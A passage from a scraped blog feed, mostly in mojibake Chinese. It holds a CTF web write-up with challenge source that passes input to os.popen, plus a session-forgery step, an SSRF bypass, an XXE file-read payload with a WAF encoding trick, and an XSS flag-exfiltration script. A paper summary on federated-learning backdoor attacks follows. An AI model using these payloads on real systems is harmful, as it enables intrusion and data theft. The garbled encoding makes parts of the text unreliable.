\u0026#34;speedboat\u0026#34;, \u0026#34;ğŸ›³ï¸\u0026#34;: \u0026#34;passenger ship\u0026#34;, \u0026#34;â›´ï¸\u0026#34;: \u0026#34;ferry\u0026#34;, \u0026#34;ğŸ›¥ï¸\u0026#34;: \u0026#34;motor boat\u0026#34;, \u0026#34;ğŸš¢\u0026#34;: \u0026#34;ship\u0026#34;, \u0026#34;ğŸ‘¶\u0026#34;: \u0026#34;baby\u0026#34;, \u0026#34;ğŸ’¿\u0026#34;: \u0026#34;CD\u0026#34;, \u0026#34;ğŸ“€\u0026#34;: \u0026#34;DVD\u0026#34;, \u0026#34;ğŸ“±\u0026#34;: \u0026#34;phone\u0026#34;, \u0026#34;ğŸ’»\u0026#34;: \u0026#34;laptop\u0026#34;, \u0026#34;â°\u0026#34;: \u0026#34;alarm clock\u0026#34;, \u0026#34;ğŸ•°ï¸\u0026#34;: \u0026#34;mantelpiece clock\u0026#34;, \u0026#34;âŒš\u0026#34;: \u0026#34;watch\u0026#34;, \u0026#34;ğŸ“¡\u0026#34;: \u0026#34;satellite antenna\u0026#34;, \u0026#34;ğŸ”‹\u0026#34;: \u0026#34;battery\u0026#34;, \u0026#34;ğŸ”Œ\u0026#34;: \u0026#34;plug\u0026#34;, \u0026#34;ğŸš©\u0026#34;: \u0026#34;flag\u0026#34;, \u0026#34;â­\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;âœ–ï¸\u0026#34;: \u0026#34;Ã—\u0026#34;, \u0026#34;â—\u0026#34;: \u0026#34;Ã·\u0026#34; } if len(set(user_input).intersection(set(string.printable.replace(\u0026#34; \u0026#34;, \u0026#39;\u0026#39;)))) \u0026gt; 0: return user_input.lower() command = user_input result = \u0026#39;emoji shell\u0026#39; for key in emoji_table: if key in command: command = command.replace(key, emoji_table[key]).lower() result = command result = result + os.popen(command + \u0026#34; 2\u0026gt;\u0026amp;1\u0026#34;).read() return result class LoginForm(FlaskForm): username = StringField(\u0026#39;Username\u0026#39;, validators=[DataRequired(), Length(min=1, max=25)]) password = PasswordField(\u0026#39;Password\u0026#39;, validators=[DataRequired()]) submit = SubmitField(\u0026#39;Login\u0026#39;) class UploadForm(FlaskForm): avatar = FileField(\u0026#39;Choose a file\u0026#39;, validators=[DataRequired()]) submit = SubmitField(\u0026#39;Upload\u0026#39;) class GameForm(FlaskForm): user_input = TextAreaField(\u0026#39;Enter something\u0026#39;, validators=[DataRequired()]) submit = SubmitField(\u0026#39;Submit\u0026#39;) def generate_jwt(username): header = {\u0026#39;alg\u0026#39;: \u0026#39;RS256\u0026#39;} payload = { \u0026#39;username\u0026#39;: username, } token = jwt.encode(header, payload, private_key) return token def decode_jwt(token): try: payload = jwt.decode(token, public_key) return payload except JoseError as e: return None @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): form = LoginForm() if form.validate_on_submit(): username = form.username.data password = form.password.data if username==\u0026#39;admin\u0026#39;: flash(\u0026#39;Invalid username or password\u0026#39;, \u0026#39;danger\u0026#39;) return render_template(\u0026#39;login.html\u0026#39;, form=form) if username: session[\u0026#39;role\u0026#39;] = \u0026#39;guest\u0026#39; token = generate_jwt(username) response = make_response(redirect(url_for(\u0026#39;dashboard\u0026#39;))) response.set_cookie(\u0026#39;token\u0026#39;, token.decode()) flash(\u0026#39;Login successful!\u0026#39;, \u0026#39;success\u0026#39;) return response else: flash(\u0026#39;Invalid username or password\u0026#39;, \u0026#39;danger\u0026#39;) return render_template(\u0026#39;login.html\u0026#39;, form=form) @app.route(\u0026#39;/dashboard\u0026#39;) def dashboard(): token = request.cookies.get(\u0026#39;token\u0026#39;) if not token: flash(\u0026#39;Please login first\u0026#39;, \u0026#39;warning\u0026#39;) return redirect(url_for(\u0026#39;login\u0026#39;)) payload = decode_jwt(token) if not payload: flash(\u0026#39;Invalid or expired token. Please login again.\u0026#39;, \u0026#39;danger\u0026#39;) return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;dashboard.html\u0026#39;) @app.route(\u0026#39;/profile\u0026#39;) def profile(): token = request.cookies.get(\u0026#39;token\u0026#39;) if not token: flash(\u0026#39;Please login first\u0026#39;, \u0026#39;warning\u0026#39;) return redirect(url_for(\u0026#39;login\u0026#39;)) payload = decode_jwt(token) if not payload: flash(\u0026#39;Invalid or expired token. Please login again.\u0026#39;, \u0026#39;danger\u0026#39;) return redirect(url_for(\u0026#39;login\u0026#39;)) user_info = {} user_info.update({ \u0026#39;username\u0026#39;: payload[\u0026#39;username\u0026#39;], \u0026#39;role\u0026#39;: session[\u0026#39;role\u0026#39;], }) return render_template(\u0026#39;profile.html\u0026#39;, user_info=user_info) @app.route(\u0026#39;/game\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def game(): token = request.cookies.get(\u0026#39;token\u0026#39;) form = GameForm() if not token: error_message = \u0026#39;Please login first\u0026#39; return render_template(\u0026#39;game.html\u0026#39;, form=form, error_message=error_message) payload = decode_jwt(token) if not payload: error_message = \u0026#39;Invalid or expired token. Please login again.\u0026#39; return render_template(\u0026#39;game.html\u0026#39;, form=form, error_message=error_message) if not payload[\u0026#39;username\u0026#39;]==\u0026#39;admin\u0026#39;: error_message = \u0026#39;You do not have permission to access this page.Your username is not admin\u0026#39; return render_template(\u0026#39;game.html\u0026#39;, form=form, error_message=error_message) user_input = None if form.validate_on_submit(): user_input = form.user_input.data user_input = game_play(user_input) return render_template(\u0026#39;game.html\u0026#39;, form=form, user_input=user_input) @app.route(\u0026#39;/upload\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def upload(): token = request.cookies.get(\u0026#39;token\u0026#39;) if not token: flash(\u0026#39;Please login first\u0026#39;, \u0026#39;warning\u0026#39;) return redirect(url_for(\u0026#39;login\u0026#39;)) payload = decode_jwt(token) form = UploadForm() if not payload or payload[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: error_message = \u0026#39;You do not have permission to access this page.Your username is not admin.\u0026#39; return render_template(\u0026#39;upload.html\u0026#39;, form=form, error_message=error_message, username=payload[\u0026#39;username\u0026#39;]) if not session[\u0026#39;role\u0026#39;] or session[\u0026#39;role\u0026#39;] != \u0026#39;admin\u0026#39;: error_message = \u0026#39;You do not have permission to access this page.Your role is not admin.\u0026#39; return render_template(\u0026#39;upload.html\u0026#39;, form=form, error_message=error_message, username=payload[\u0026#39;username\u0026#39;]) if form.validate_on_submit(): file = form.avatar.data if file: filename = secure_filename(file.filename) files = {\u0026#39;file\u0026#39;: (filename, file.stream, file.content_type)} php_service_url = \u0026#39;http://127.0.0.1/upload.php\u0026#39; response = requests.post(php_service_url, files=files) if response.status_code == 200: flash(response.text, \u0026#39;success\u0026#39;) else: flash(\u0026#39;Failed to upload file to PHP service\u0026#39;, \u0026#39;danger\u0026#39;) return render_template(\u0026#39;upload.html\u0026#39;, form=form) @app.route(\u0026#39;/view_uploads\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def view_uploads(): token = request.cookies.get(\u0026#39;token\u0026#39;) form = GameForm() if not token: error_message = \u0026#39;Please login first\u0026#39; return render_template(\u0026#39;view_uploads.html\u0026#39;, form=form, error_message=error_message) payload = decode_jwt(token) if not payload: error_message = \u0026#39;Invalid or expired token. Please login again.\u0026#39; return render_template(\u0026#39;view_uploads.html\u0026#39;, form=form, error_message=error_message) if not payload[\u0026#39;username\u0026#39;]==\u0026#39;admin\u0026#39;: error_message = \u0026#39;You do not have permission to access this page.Your username is not admin\u0026#39; return render_template(\u0026#39;view_uploads.html\u0026#39;, form=form, error_message=error_message) user_input = None if form.validate_on_submit(): filepath = form.user_input.data pathurl = request.form.get(\u0026#39;path\u0026#39;) if (\u0026#34;www.testctf.com\u0026#34; not in pathurl) or (\u0026#34;127.0.0.1\u0026#34; in pathurl) or (\u0026#39;/var/www/html/uploads/\u0026#39; not in filepath) or (\u0026#39;.\u0026#39; in filepath): error_message = \u0026#34;www.testctf.com must in path and /var/www/html/uploads/ must in filepath.\u0026#34; return render_template(\u0026#39;view_uploads.html\u0026#39;, form=form, error_message=error_message) params = {\u0026#39;s\u0026#39;: filepath} try: response = requests.get(\u0026#34;http://\u0026#34;+pathurl, params=params, timeout=1) return render_template(\u0026#39;view_uploads.html\u0026#39;, form=form, user_input=response.text) except: error_message = \u0026#34;500! Server Error\u0026#34; return render_template(\u0026#39;view_uploads.html\u0026#39;, form=form, error_message=error_message) return render_template(\u0026#39;view_uploads.html\u0026#39;, form=form, user_input=user_input) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.clear() response = make_response(redirect(url_for(\u0026#39;login\u0026#39;))) response.delete_cookie(\u0026#39;token\u0026#39;) flash(\u0026#39;You have been logged out\u0026#39;, \u0026#39;info\u0026#39;) return response if __name__ == \u0026#39;__main__\u0026#39;: app.run() å¯ä»¥çœ‹åˆ°è¿˜æœ‰ä¸ªsessionï¼Œä½†æ˜¯æœ‰keyï¼Œå¾ˆå®¹æ˜“æ„é€ ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from flask import Flask, session app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = \u0026#39;36f8efbea152e50b23290e0ed707b4b0\u0026#39; @app.route(\u0026#39;/login\u0026#39;) def login(): # è®¾ç½®ç”¨æˆ·è§’è‰²ä¸º admin session[\u0026#39;role\u0026#39;] = \u0026#39;admin\u0026#39; return \u0026#39;Logged in as admin\u0026#39; @app.route(\u0026#39;/session\u0026#39;) def show_session(): # æ˜¾ç¤ºå½“å‰ä¼šè¯ä¿¡æ¯ return f\u0026#34;Current session role: {session.get(\u0026#39;role\u0026#39;, \u0026#39;Not logged in\u0026#39;)}\u0026#34; if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=True) æ‰“å¼€æœ¬åœ°é¡µé¢æ‹¿åˆ°sessionå³å¯ï¼Œæˆ–è€…åˆ«çš„è„šæœ¬ä¹Ÿå¯ä»¥\næ ¹æ®è¿‡æ»¤æ¡ä»¶æˆ‘ä»¬å¾ˆå®¹æ˜“å‘ç°view_uploadså¤„æœ‰ä¸ªssrfï¼Œå¾ˆå®¹æ˜“ç»•è¿‡:\n1 csrf_token=IjliOWJjYmFiOTYwNWM4NGY4MjFjYzc1OWQ3Njg2OGZlMTMyNjkzNGYi.ZyCzUA.G0Mp5_49tYfctHqZH2Keox5bYy4\u0026amp;path=www.testctf.com@localhost/index.php\u0026amp;user_input=%2Fvar%2Fwww%2Fhtml%2Fuploads%2F20de556e638eb01cd3e5fdd0a08d4167\u0026amp;submit=Submit å°è¯•è®¿é—®index.phpï¼Œå›æ˜¾ï¼š\n1 2 3 The value of user_input is: /var/www/html/uploads/20de556e638eb01cd3e5fdd0a08d4167Failed to load XML file. è€ƒè™‘xxe\n1 2 3 4 5 6 7 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; ?\u0026gt; \u0026lt;!DOCTYPE x[ \u0026lt;!ENTITY k1te SYSTEM \u0026#34;php://filter/convert.base64-encode/resource=flag.php\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;person\u0026gt; \u0026lt;name\u0026gt;\u0026amp;k1te;\u0026lt;/name\u0026gt; \u0026lt;/person\u0026gt; ç”±äºæœ‰wafï¼Œç¼–ç ç»•è¿‡ï¼š\n1 cat payload | iconv -f utf-8 -t utf-16be \u0026gt; payload.xml flagï¼š\n1 2 3 The value of user_input is: /var/www/html/uploads/054891ca373134a47a817ed3be4dc1d6name: PD9waHAKJGZsYWc9IndkZmxhZ3thdWZod3BwNnRxMTRhbTdiazIzN3BieXl6dzJuZzQ4d30iOwo= å…¶å®åº”è¯¥æ‰“ä¸€ä¸ªæ— å›æ˜¾çš„ï¼Œä½†æ˜¯åˆšå¥½æ’å¯¹äº†\nweb02 åˆšå¼€å§‹æ²¡å»æ‰«ç›®å½•ï¼Œå¯¼è‡´æ‰“cookieæ‰“äº†åŠå¤©ï¼Œæœ€åæ‰å‘ç°æœ‰ä¸ª/flagè·¯ç”±\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;script\u0026gt;fetch(\u0026#39;/flag\u0026#39;) .then(response =\u0026gt; response.text()) .then(data =\u0026gt; { var flag = data; fetch(\u0026#39;/content/2755d0d0eb060eabc05e8196479af6ba\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39;, }, body: new URLSearchParams({ content: flag }) }); }); \u0026lt;/script\u0026gt; ","date":"2024-10-31T12:12:36+08:00","permalink":"https://k1te.cn/p/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84web%E5%85%A8wp/","title":"2024ç½‘é¼æ¯é’é¾™ç»„Webå…¨WP"},{"content":"Info NeurIPS 2023\nVanderbilt Universityç­‰\nä»£ç åœ°å€ï¼šsail-research/iba: IBA: Towards Irreversible Backdoor Attacks in Federated Learning (Poster at NeurIPS 2023)\nAbstract è”åˆå­¦ä¹ ï¼ˆFLï¼‰æ˜¯ä¸€ç§åˆ†å¸ƒå¼å­¦ä¹ æ–¹æ³•ï¼Œå®ƒèƒ½åœ¨ä¸æŸå®³ç»ˆç«¯è®¾å¤‡çš„ä¸ªäººæ½œåœ¨æ•æ„Ÿæ•°æ®çš„æƒ…å†µä¸‹ï¼Œåœ¨åˆ†æ•£æ•°æ®ä¸Šè®­ç»ƒæœºå™¨å­¦ä¹ æ¨¡å‹ã€‚ç„¶è€Œï¼Œåˆ†å¸ƒå¼æ€§è´¨å’Œæœªç»è°ƒæŸ¥çš„æ•°æ®ç›´è§‚åœ°å¼•å…¥äº†æ–°çš„å®‰å…¨æ¼æ´ï¼ŒåŒ…æ‹¬åé—¨æ”»å‡»ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ•Œæ–¹ä¼šåœ¨è®­ç»ƒè¿‡ç¨‹ä¸­å°†åé—¨åŠŸèƒ½æ¤å…¥å…¨å±€æ¨¡å‹ä¸­ï¼Œä»è€Œæ¿€æ´»è¯¥åŠŸèƒ½ï¼Œåœ¨è¾“å…¥ä»»ä½•ç‰¹å®šæ•Œæ–¹æ¨¡å¼æ—¶å¼•å‘æ‰€éœ€çš„ä¸å½“è¡Œä¸ºã€‚å°½ç®¡åœ¨è§¦å‘å’Œæ‰­æ›²æ¨¡å‹è¡Œä¸ºæ–¹é¢å–å¾—äº†æ˜¾è‘—çš„æˆåŠŸï¼Œä½† FL ä¸­å…ˆå‰çš„åé—¨æ”»å‡»å¾€å¾€æŒæœ‰ä¸åˆ‡å®é™…çš„å‡è®¾ã€æœ‰é™çš„ä¸å¯å¯Ÿè§‰æ€§å’ŒæŒä¹…æ€§ã€‚å…·ä½“æ¥è¯´ï¼Œå¯¹æ‰‹éœ€è¦æ§åˆ¶è¶³å¤Ÿå¤šçš„å®¢æˆ·ç«¯ï¼Œæˆ–è€…çŸ¥é“å…¶ä»–è¯šå®å®¢æˆ·ç«¯çš„æ•°æ®åˆ†å¸ƒã€‚åœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œæ’å…¥çš„è§¦å‘å™¨å¾€å¾€æ˜¯ç›´è§‚å¯è§çš„ï¼Œè€Œä¸”å¦‚æœå°†å¯¹æ‰‹ä»è®­ç»ƒè¿‡ç¨‹ä¸­ç§»é™¤ï¼Œåé—¨æ•ˆåº”å¾ˆå¿«å°±ä¼šè¢«å‰Šå¼±ã€‚ä¸ºäº†è§£å†³è¿™äº›å±€é™æ€§ï¼Œæˆ‘ä»¬åœ¨ FL ä¸­æå‡ºäº†ä¸€ç§æ–°é¢–çš„åé—¨æ”»å‡»æ¡†æ¶\u0026ndash;ä¸å¯é€†åé—¨æ”»å‡»ï¼ˆIrreversible Backdoor Attacks, IBAï¼‰ï¼Œå®ƒå¯ä»¥å…±åŒå­¦ä¹ æœ€ä½³çš„ã€è§†è§‰ä¸Šéšè”½çš„è§¦å‘å™¨ï¼Œç„¶åé€æ­¥å°†åé—¨æ¤å…¥å…¨å±€æ¨¡å‹ã€‚è¿™ç§æ–¹æ³•å¯ä»¥è®©æ•Œæ–¹åœ¨èº²é¿äººç±»å’Œæœºå™¨æ£€æŸ¥çš„åŒæ—¶å®æ–½åé—¨æ”»å‡»ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜é€šè¿‡é€‰æ‹©æ€§åœ°æ¯’åŒ–æœ€ä¸å¯èƒ½ç”±ä¸»ä»»åŠ¡å­¦ä¹ è¿‡ç¨‹æ›´æ–°çš„æ¨¡å‹å‚æ•°ï¼Œå¹¶å°†æ¯’åŒ–æ¨¡å‹æ›´æ–°é™åˆ¶åœ¨å…¨å±€æ¨¡å‹é™„è¿‘ï¼Œä»è€Œæé«˜äº†æ‰€ææ”»å‡»çš„æ•ˆç‡å’ŒæŒä¹…æ€§ã€‚æœ€åï¼Œæˆ‘ä»¬åœ¨å‡ ä¸ªåŸºå‡†æ•°æ®é›†ï¼ˆåŒ…æ‹¬ MNISTã€CIFAR-10 å’Œ Tiny ImageNetï¼‰ä¸Šå¯¹æ‰€æå‡ºçš„æ”»å‡»æ¡†æ¶è¿›è¡Œäº†è¯„ä¼°ï¼Œè¯„ä¼°ç»“æœè¡¨æ˜ï¼Œä¸å…¶ä»–åé—¨æ”»å‡»ç›¸æ¯”ï¼ŒIBA åœ¨ç»•è¿‡ç°æœ‰åé—¨é˜²å¾¡æªæ–½å¹¶å®ç°æ›´æŒä¹…åé—¨æ•ˆæœçš„åŒæ—¶ï¼Œè¿˜å–å¾—äº†å¾ˆé«˜çš„æˆåŠŸç‡ã€‚æ€»ä½“è€Œè¨€ï¼ŒIBAä¸º FL ä¸­çš„åé—¨æ”»å‡»æä¾›äº†ä¸€ç§æ›´æœ‰æ•ˆã€éšè”½å’ŒæŒä¹…çš„æ–¹æ³•ã€‚\nContributions æå‡ºäº†ä¸€ç§ä¸¤é˜¶æ®µè”é‚¦å­¦ä¹ åé—¨æ”»å‡»æ–¹æ³•IBAï¼ŒåŠ¨æ€ç”Ÿæˆè§¦å‘å™¨ï¼Œå¹¶ä¸”æ˜¯ä¸å¯è§åé—¨æ”»å‡»ï¼Œä¿è¯äº†æ¨ç†é˜¶æ®µä¸è¢«å‘ç°ã€‚IBAå°†æ±¡æŸ“æ¨¡å‹çš„æ›´æ–°é™åˆ¶åœ¨å…¨çƒæ¨¡å‹é™„è¿‘ï¼Œé™ä½æ¶æ„æ›´æ–°è¢«æ£€æµ‹å‡ºæ¥çš„é£é™©ã€‚ åœ¨å­¦ä¹ è¿‡ç¨‹ä¸­é€‰æ‹©ä¸å¤ªå¯èƒ½æ›´æ–°çš„æ¨¡å‹å‚æ•°è¿›è¡ŒæŠ•æ¯’ï¼Œå¢åŠ æŒä¹…æ€§ã€‚ æœ€å…ˆè¿›çš„æ”»å‡»æ€§èƒ½ã€éšè”½æ€§ã€æŒä¹…æ€§ã€‚ Thread Model æ”»å‡»è€…Aä»…æ§åˆ¶ä¸€ä¸ªå®¢æˆ·ç«¯kï¼Œå¹¶ä¸”å®ƒå°†åœ¨æ¯kè½®ä¸­å‚ä¸è®­ç»ƒï¼Œå³å›ºå®šé¢‘ç‡æ”»å‡»ï¼›\næ”»å‡»è€…Aèƒ½å¤Ÿå®Œå…¨æ§åˆ¶å®¢æˆ·ç«¯Aï¼Œä½†æ˜¯æ— æ³•è®¿é—®å…¶ä»–çš„è‰¯æ€§å®¢æˆ·ç«¯ï¼›\nå‡è®¾Aå®Œå…¨äº†è§£ä¸­å¤®æœåŠ¡å™¨å’Œä»»ä½•å¯èƒ½çš„é˜²å¾¡æªæ–½ï¼Œä½†æ˜¯ä¸èƒ½æ”¹å˜æœåŠ¡å™¨çš„å‚æ•°å’Œç®—æ³•ã€‚\nMethod é¦–å…ˆè®²è§£ä¸€ä¸‹å¤§è‡´çš„æµç¨‹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå…¶å®éå¸¸ç®€å•ï¼Œä¸»è¦åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼Œç¬¬ä¸€ä¸ªé˜¶æ®µæ˜¯è§¦å‘å™¨çš„ç”Ÿæˆï¼Œç¬¬äºŒä¸ªé˜¶æ®µæ˜¯åé—¨çš„æ³¨å…¥ã€‚çœ‹èµ·æ¥å¥½åƒå¹³å¹³æ— å¥‡ï¼Œä¸‹é¢è®²ä¸€ä¸‹å„ä¸ªæ­¥éª¤çš„å…·ä½“çš„ç‚¹ã€‚\nTrigger Generating å™ªå£°çš„ç”Ÿæˆå‡½æ•°å¦‚ä¸‹ï¼Œå‡½æ•°Gæ˜¯è§¦å‘ç”Ÿæˆå‡½æ•°ï¼Œå‡½æ•°Tæ˜¯åé—¨å›¾åƒç”Ÿæˆå‡½æ•°ï¼š $$ T_\\xi(x) = x + G_\\xi(x), \\parallel G_\\xi(x) \\parallel_\\infty\\le\\epsilon,\\forall x $$\nå‡½æ•°Gçš„è¿­ä»£è¿‡ç¨‹å¦‚ä¸‹ï¼š $$ \\xi \\larr \\xi - \\eta_\\xi \\sum_{x\\in \\mathcal{D} } \\mathcal{L}\\xi (f{w_k}(T_\\xi(x)),y_T) $$\nå…¶ä¸­ï¼Œ$f_w$æ˜¯è®­ç»ƒå¥½çš„æœ¬åœ°æ¨¡å‹ï¼Œå°†å…¶ä½œä¸ºæ›¿ä»£æ¨¡å‹ï¼Œ$y_T$æ˜¯ç›®æ ‡æ ‡ç­¾ã€‚\nä½œè€…è¯´è¿™ä¸€æƒ³æ³•æ¥è‡ªäºå¯¹æŠ—æ”»å‡»ï¼Œä½†å…¶å®ä¸ä¼ ç»Ÿçš„æ— ç›®æ ‡å¯¹æŠ—å®Œå…¨ç›¸åï¼Œæ— ç›®æ ‡å¯¹æŠ—çš„ç›®æ ‡å‡½æ•°å°†æ ·æœ¬çš„é¢„æµ‹ç»“æœä¸æœ¬èº«çš„æ ‡ç­¾æœ€å¤§åŒ–ï¼Œè€Œç”Ÿæˆå‡½æ•°Gçš„ç›®æ ‡åˆ™æ˜¯æœ€å¤§åŒ–æ ·æœ¬çš„é¢„æµ‹ç»“æœä¸åé—¨çš„ç›®æ ‡æ ‡ç­¾ï¼Œè¿™æ ·åšçš„ç»“æœå°±æ˜¯å°†ç”Ÿæˆçš„å™ªå£°ä¸ç›®æ ‡ç±»å¯¹é½ï¼Œæˆ–è€…è¯´ï¼Œå°†å…¶æŒ‡å‘ç›®æ ‡ç±»å†…éƒ¨ï¼Œæ²¡é”™ï¼Œè¿™å°±æ˜¯ä¹‹å‰Narcissusçš„åšæ³•ï¼Œä½ å¯ä»¥å°†ç”Ÿæˆçš„å™ªå£°çœ‹ä½œè‚‰çœ¼ä¸å¯è§çš„ç›®æ ‡ç±»å›¾åƒï¼Œé™„åŠ åœ¨è¾“å…¥ä¸Šï¼Œæ¨¡å‹ä¸€çœ‹åˆ°ä¾¿å°†å…¶è¯†åˆ«ä¸ºç›®æ ‡ç±»ï¼Œæ•ˆæœååˆ†å¥½ã€‚\nBackdoor Injecting ä½œè€…çš„ç›®æ ‡æ˜¯ç”Ÿæˆä¸€ä¸ªæœ¬åœ°çš„åé—¨æ¨¡å‹$f_w$â€‹â€‹ï¼Œå…¶ç›®æ ‡å‡½æ•°å¦‚ä¸‹ï¼š $$ \\min_{w} \\sum_{x \\in \\mathcal{D}} \\alpha \\mathcal{L}{\\text{clean}}(f{w_k}(x), y_x) + \\beta \\mathcal{L}{\\text{poison}}(f{w_k}(T_{\\xi}(x)), y_T) $$\næ™®é€šçš„åé—¨æ”»å‡»çš„æŸå¤±å‡½æ•°åªæœ‰ååŠæ®µï¼Œæœ€å°åŒ–åé—¨å›¾åƒçš„é¢„æµ‹ç»“æœå’Œç›®æ ‡æ ‡ç­¾å³å¯ï¼Œä½†æ˜¯æœ¬æ–‡è¿˜åŠ ä¸Šäº†å‰åŠæ®µï¼Œå³æ™®é€šçš„åˆ†ç±»ä¼˜åŒ–å‡½æ•°ï¼Œå‰åŠæ®µæé«˜ACCï¼ŒååŠæ®µæé«˜ASRï¼Œåº”è¯¥ç¡®å®å¯ä»¥æœ‰æ•ˆæé«˜ACCï¼Œä½†æ˜¯æ‰€ä»˜å‡ºçš„ä»£ä»·å‘¢ï¼Ÿèƒ½åŠ›æœ‰é™ï¼Œå…ˆå­˜ç–‘å§ã€‚\nAttack Model Retraining ç”±äºæˆ‘ä»¬å°†æœ¬åœ°æ¨¡å‹$f_w$ä½œä¸ºæ›¿ä»£æ¨¡å‹å¾—åˆ°è§¦å‘ç”Ÿæˆæ¨¡å‹$G$ï¼Œè€Œæœ¬åœ°æ¨¡å‹æ˜¯ä¸€ç›´å˜åŒ–çš„ï¼Œå› æ­¤ä½œè€…æå‡ºæˆ‘ä»¬çš„ç”Ÿæˆæ¨¡å‹Géœ€è¦é¢‘ç¹åœ°è¿›è¡Œæ›´æ–°ï¼Œä½¿å…¶ä¸å…¨å±€æ¨¡å‹ä¿æŒåŒæ­¥ã€‚\nPartial Model Poisoning éƒ¨åˆ†æ¨¡å‹æ±¡æŸ“æ—¨åœ¨é€šè¿‡é€‰æ‹©ç‰¹å®šçš„æ±¡æŸ“ç©ºé—´å’Œç»´åº¦æ¥å¢å¼ºæ”»å‡»çš„æŒä¹…æ€§å’Œæœ‰æ•ˆæ€§ã€‚è¿™ç§æ–¹æ³•çš„å…³é”®åœ¨äºï¼š\nåŸºäºç©ºé—´çš„æ±¡æŸ“ï¼šé€šè¿‡é™åˆ¶æ¨¡å‹çš„å‚æ•°ï¼Œä½¿å…¶ä¿æŒåœ¨è‰¯æ€§æ¨¡å‹çš„é™„è¿‘ï¼Œä»è€Œå¸®åŠ©æ”»å‡»ç»•è¿‡åŸºäºåé—¨çš„é˜²å¾¡ã€‚ åŸºäºç»´åº¦çš„æ±¡æŸ“ï¼šé€šè¿‡ç¼©å°è¢«æ±¡æŸ“çš„ç¥ç»å…ƒï¼Œå‡å°æ¥è‡ªè‰¯æ€§å®¢æˆ·ç«¯çš„ç¨€é‡Šæ•ˆåº”ã€‚ Poisoned-Space Based æ•°å­¦ä¸æ˜¯ç‰¹åˆ«å¥½ï¼Œä¸‹é¢çš„è§£é‡Šæ¥è‡ªäºChatGPTï¼š\nåœ¨è¿™ç§æ”»å‡»ä¸‹ï¼Œæäº¤çš„æœ¬åœ°æ¨¡å‹é€šè¿‡å…¶å‚æ•°çš„å¤§å°é™åˆ¶è€Œéƒ¨åˆ†è¢«æ±¡æŸ“ã€‚å…·ä½“æ¥è¯´ï¼Œæ”»å‡»è€…å¯¹è‰¯æ€§æ•°æ®é›† Då’Œè¢«æ±¡æŸ“æ•°æ®é›† Dâ€˜ çš„æŸå¤±åº”ç”¨æŠ•å½±æ¢¯åº¦ä¸‹é™ã€‚è¿™é‡Œçš„å…³é”®æ­¥éª¤æ˜¯ï¼š\næŠ•å½±è¿‡ç¨‹ï¼šå®šæœŸå°†æ¨¡å‹å‚æ•°æŠ•å½±åˆ°ä»¥å…¨å±€æ¨¡å‹ä¸ºä¸­å¿ƒçš„çƒä½“ä¸Šã€‚è¿™æ ·å¯ä»¥ç¡®ä¿äº§ç”Ÿçš„è¢«æ±¡æŸ“æ¨¡å‹ä¸åŸå§‹æ¨¡å‹çš„åå·®ä¸ä¼šå¤ªå¤§ã€‚\næ•°å­¦è¡¨è¾¾ï¼šè¿™å¯ä»¥é€šè¿‡å…¬å¼è¡¨ç¤ºä¸ºï¼š $$ \\parallel w_k - w \\parallel \\le \\delta $$ å…¶ä¸­ $w_k$æ˜¯æœ¬åœ°æ¨¡å‹ï¼Œ$w$æ˜¯å…¨å±€æ¨¡å‹ï¼Œ$\\delta$æ˜¯å…è®¸çš„æœ€å¤§åå·®ã€‚\næ­¤å¤–ï¼Œè¿™ç§æ”»å‡»ç­–ç•¥å¯ä»¥ä¸æ¨¡å‹æ›¿æ¢ç»“åˆä½¿ç”¨ï¼Œé€šè¿‡åœ¨å‘é€æ¨¡å‹åˆ°æœåŠ¡å™¨ä¹‹å‰å¯¹æ¨¡å‹å‚æ•°è¿›è¡Œç¼©æ”¾ï¼Œæ¥æŠµæ¶ˆå…¶ä»–è¯šå®å®¢æˆ·ç«¯çš„è´¡çŒ®ã€‚å…·ä½“çš„ç¼©æ”¾æ¨¡å‹è®¡ç®—å…¬å¼ä¸ºï¼š $$ \\hat{w_k} \\simeq w_k + \\sum_{i\\in C \\setminus k}\\frac{n_i}{n_{\\mathcal{C} \\setminus k}} (w_k - w^*). $$\nè¿™é‡Œï¼Œ$n_i$æ˜¯å®¢æˆ·ç«¯$i$çš„æ ·æœ¬æ•°é‡ï¼Œ$n_{\\mathcal{C} \\setminus k}$æ˜¯æ‰€æœ‰å…¶ä»–å®¢æˆ·ç«¯çš„æ ·æœ¬æ€»æ•°ï¼Œ$ w^*$æ˜¯ç†æƒ³çš„å…¨å±€æ¨¡å‹ã€‚\nPoisoning-dimension based ç”±äºæ”»å‡»è€…æ— æ³•å‚ä¸æ¯ä¸€è½®è®­ç»ƒï¼Œç›´æ¥æäº¤è¢«æ±¡æŸ“çš„æ¨¡å‹åˆ°æœåŠ¡å™¨æ˜¯æ— 